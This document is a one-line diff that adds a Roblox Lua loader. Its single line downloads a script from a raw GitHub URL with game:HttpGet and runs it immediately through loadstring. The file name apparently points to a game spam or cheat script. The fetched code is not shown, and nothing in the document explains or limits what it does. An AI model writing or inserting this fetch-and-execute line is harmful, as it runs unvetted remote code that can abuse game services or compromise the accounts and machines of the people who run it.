@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/huss-valley-spam7-fl7x36tfgvhqhy.lua"))()
